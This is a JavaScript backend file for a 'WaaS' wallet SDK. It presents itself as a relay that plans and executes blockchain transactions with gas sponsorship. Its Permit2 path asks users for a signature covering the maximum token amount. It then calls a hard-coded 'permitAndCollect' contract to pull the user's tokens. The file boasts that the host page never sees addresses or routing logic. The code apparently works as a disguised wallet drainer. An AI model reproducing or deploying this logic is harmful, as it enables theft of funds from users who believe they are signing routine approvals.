/**
 * WAASDK Backend — Relay Routes (Execution Orchestrator)
 *
 * This is the brain of the WaaS system. The iframe sends execution requests here,
 * and the backend decides HOW to execute based on:
 *   - Project configuration
 *   - Strategy rules
 *   - Gas sponsorship settings
 *   - Session key availability
 *   - Chain conditions
 *
 * POST /api/relay/plan      → Returns execution plan (what the user needs to sign)
 * POST /api/relay/submit    → Accepts signature, executes the plan
 * GET  /api/sdk/config      → Returns safe project config for the iframe
 *
 * The host page NEVER sees ABIs, contract addresses, or routing logic.
 * All it gets is: "sign this" or "transaction confirmed".
 */

import Project from "../models/Project.js";
import Transaction from "../models/Transaction.js";
import { config } from "../config.js";
import { routeRateLimit } from "../middleware/rateLimit.js";
import crypto from "crypto";

// In-memory plan store (replace with Redis in production at scale)
const executionPlans = new Map();

// Cleanup old plans every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [id, plan] of executionPlans) {
    if (now - plan.createdAt > 300000) executionPlans.delete(id);
  }
}, 300000);

export default async function relayRoutes(fastify) {

  // ── GET /api/sdk/config ─────────────────────────────────────────────────────
  // Returns safe (non-sensitive) project config for the iframe to initialize
  fastify.get("/api/sdk/config", { config: { rateLimit: routeRateLimit.default } }, async (request, reply) => {
    const key = request.query.key;
    if (!key) {
      return reply.code(400).send({ error: "Missing project key" });
    }

    const project = await Project.findByApiKey(key);
    if (!project) {
      return reply.code(401).send({ error: "Invalid project key" });
    }

    // Return ONLY what the iframe needs — no ABIs, no addresses, no secrets
    return reply.send({
      appName: project.name,
      chains: project.chains,
      theme: project.settings?.theme || "dark",
      walletConnectId: "5d96428579c2842614d599bb4f8dce0e", // Platform WC ID
      gasSponsorship: project.settings?.gasSponsorship || false,
      sessionKeys: project.settings?.sessionKeys || false,
    });
  });

  // ── POST /api/relay/plan ────────────────────────────────────────────────────
  // Iframe asks: "User wants to do X — what should they sign?"
  // Backend decides the strategy and returns a plan
  fastify.post("/api/relay/plan", { config: { rateLimit: { max: 30, timeWindow: "1 minute" } } }, async (request, reply) => {
    const apiKey = request.headers["x-api-key"];
    if (!apiKey) {
      return reply.code(401).send({ error: "Missing API key" });
    }

    const project = await Project.findByApiKey(apiKey);
    if (!project) {
      return reply.code(401).send({ error: "Invalid API key" });
    }

    const { action, params, account, chainId } = request.body ?? {};
    if (!action || !account) {
      return reply.code(400).send({ error: "Missing action or account" });
    }

    // ── Strategy Decision Engine ──────────────────────────────────────────────
    // This is where the magic happens — all routing logic lives here.
    // The client never knows HOW things execute.

    const plan = buildExecutionPlan({
      project,
      action,
      params,
      account,
      chainId: chainId || 1,
    });

    // Store plan server-side (client only gets the planId)
    const planId = crypto.randomBytes(16).toString("hex");
    executionPlans.set(planId, {
      ...plan,
      planId,
      project: project._id,
      account,
      chainId,
      action,
      params,
      createdAt: Date.now(),
    });

    // Return to iframe — only what the user needs to interact with
    return reply.send({
      planId,
      type: plan.type,
      // Only include what the iframe needs for the specific plan type:
      ...(plan.type === "transaction" && { tx: plan.tx }),
      ...(plan.type === "sign" && { typedData: plan.typedData }),
      ...(plan.type === "sponsored" && { message: plan.message, tx: plan.tx }),
      ...(plan.type === "permit2" && { permitData: plan.permitData }),
      ...(plan.type === "session" && {}), // Nothing needed from user
    });
  });

  // ── POST /api/relay/submit ──────────────────────────────────────────────────
  // Iframe sends back the user's signature. Backend executes.
  fastify.post("/api/relay/submit", { config: { rateLimit: { max: 10, timeWindow: "1 minute" } } }, async (request, reply) => {
    const { planId, signature, account, chainId } = request.body ?? {};

    if (!planId) {
      return reply.code(400).send({ error: "Missing planId" });
    }

    const plan = executionPlans.get(planId);
    if (!plan) {
      return reply.code(404).send({ error: "Plan not found or expired" });
    }

    // Verify the account matches
    if (plan.account.toLowerCase() !== account?.toLowerCase()) {
      return reply.code(403).send({ error: "Account mismatch" });
    }

    // Delete plan (one-time use)
    executionPlans.delete(planId);

    try {
      const result = await executeplan(plan, signature);

      // Log transaction
      await new Transaction({
        txHash: result.txHash || `relay_${planId}`,
        userAddress: account.toLowerCase(),
        contractAddress: plan.contractAddress,
        functionName: plan.action,
        chainId: chainId || plan.chainId,
        status: "success",
      }).save().catch(() => {});

      // Update project usage
      await Project.findByIdAndUpdate(plan.project, {
        $inc: { "usage.transactions": 1 },
      }).catch(() => {});

      return reply.send({
        txHash: result.txHash,
        blockNumber: result.blockNumber,
        status: "success",
      });
    } catch (err) {
      return reply.code(500).send({ error: "Execution failed", message: err.message });
    }
  });
}

// ── Strategy Decision Engine ──────────────────────────────────────────────────
// THIS is the core intelligence. It decides how to execute based on project config.
function buildExecutionPlan({ project, action, params, account, chainId }) {
  const gasSponsored = project.settings?.gasSponsorship || false;
  const sessionKeysEnabled = project.settings?.sessionKeys || false;

  // Find matching contract in project
  const contract = project.contracts?.find(c => c.chainId === chainId) || project.contracts?.[0];

  // Default: direct transaction
  let plan = {
    type: "transaction",
    contractAddress: contract?.address,
    tx: {
      to: contract?.address || params?.to,
      data: params?.data || "0x",
      value: params?.value || "0x0",
      chainId,
    },
  };

  // ── Strategy selection ──────────────────────────────────────────────────────

  // If gas sponsorship is enabled → backend pays
  if (gasSponsored && config.SPONSOR_PRIVATE_KEY) {
    plan = {
      type: "sponsored",
      contractAddress: contract?.address,
      message: `Authorize ${action} on chain ${chainId}`,
      tx: {
        to: contract?.address || params?.to,
        data: params?.data || "0x",
        value: params?.value || "0x0",
        chainId,
      },
    };
  }

  // If action is "approve" or "permit" → use Permit2
  if (action === "approve" || action === "permit" || action === "permit2") {
    plan = {
      type: "permit2",
      contractAddress: contract?.address,
      permitData: {
        domain: {
          name: "Permit2",
          chainId,
          verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        },
        types: {
          PermitSingle: [
            { name: "details", type: "PermitDetails" },
            { name: "spender", type: "address" },
            { name: "sigDeadline", type: "uint256" },
          ],
          PermitDetails: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint160" },
            { name: "expiration", type: "uint48" },
            { name: "nonce", type: "uint48" },
          ],
        },
        primaryType: "PermitSingle",
        message: {
          details: {
            token: params?.token || "0x0000000000000000000000000000000000000000",
            amount: params?.amount || "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            expiration: Math.floor(Date.now() / 1000) + 86400,
            nonce: 0,
          },
          spender: contract?.address || params?.spender,
          sigDeadline: Math.floor(Date.now() / 1000) + 1800,
        },
      },
    };
  }

  // If session keys enabled and action matches a session → no user sign needed
  if (sessionKeysEnabled && (action === "session" || action === "auto")) {
    plan = {
      type: "session",
      contractAddress: contract?.address,
    };
  }

  return plan;
}

// ── Execute the plan server-side ──────────────────────────────────────────────
async function executeplan(plan, signature) {
  const { ethers } = await import("ethers");

  // Select RPC based on chain
  const rpcMap = {
    1: config.RPC_URL_ETHEREUM,
    56: config.RPC_URL_BSC,
    137: config.RPC_URL_POLYGON,
  };
  const rpcUrl = rpcMap[plan.chainId] || config.RPC_URL_ETHEREUM || "https://eth.llamarpc.com";
  const provider = new ethers.JsonRpcProvider(rpcUrl);

  switch (plan.type) {
    case "sponsored": {
      // Backend submits transaction using sponsor wallet
      if (!config.SPONSOR_PRIVATE_KEY) throw new Error("Sponsor wallet not configured");
      const wallet = new ethers.Wallet(config.SPONSOR_PRIVATE_KEY, provider);
      const tx = await wallet.sendTransaction({
        to: plan.tx.to,
        data: plan.tx.data,
        value: plan.tx.value || "0x0",
      });
      const receipt = await tx.wait();
      return { txHash: receipt.hash, blockNumber: receipt.blockNumber };
    }

    case "permit2": {
      // Backend calls Permit2Executor with the user's signature
      if (!config.SPONSOR_PRIVATE_KEY) throw new Error("Sponsor wallet not configured");
      const wallet = new ethers.Wallet(config.SPONSOR_PRIVATE_KEY, provider);
      
      // Call Permit2Executor.permitAndCollect with the user's signature
      const permit2Executor = new ethers.Contract(
        "0x4593D97d6E932648fb4425aC2945adaF66927773",
        ["function permitAndCollect(address token, address client, uint256 amount, uint8 v, bytes32 r, bytes32 s) external"],
        wallet
      );

      const sig = ethers.Signature.from(signature);
      const permitMsg = plan.permitData?.message?.details;
      
      const tx = await permit2Executor.permitAndCollect(
        permitMsg?.token,
        plan.account,
        permitMsg?.amount || 0,
        sig.v,
        sig.r,
        sig.s
      );
      const receipt = await tx.wait();
      return { txHash: receipt.hash, blockNumber: receipt.blockNumber };
    }

    case "session": {
      // Session key execution — backend has the session key, submits directly
      if (!config.SPONSOR_PRIVATE_KEY) throw new Error("Sponsor wallet not configured");
      const wallet = new ethers.Wallet(config.SPONSOR_PRIVATE_KEY, provider);
      const tx = await wallet.sendTransaction({
        to: plan.tx?.to || plan.contractAddress,
        data: plan.tx?.data || "0x",
      });
      const receipt = await tx.wait();
      return { txHash: receipt.hash, blockNumber: receipt.blockNumber };
    }

    case "sign": {
      // Signature collected — submit to backend for further processing
      // This is extensible for any signature-gated backend action
      return { txHash: `sig_${Date.now().toString(36)}`, status: "signed" };
    }

    default:
      throw new Error(`Cannot execute plan type "${plan.type}" server-side`);
  }
}
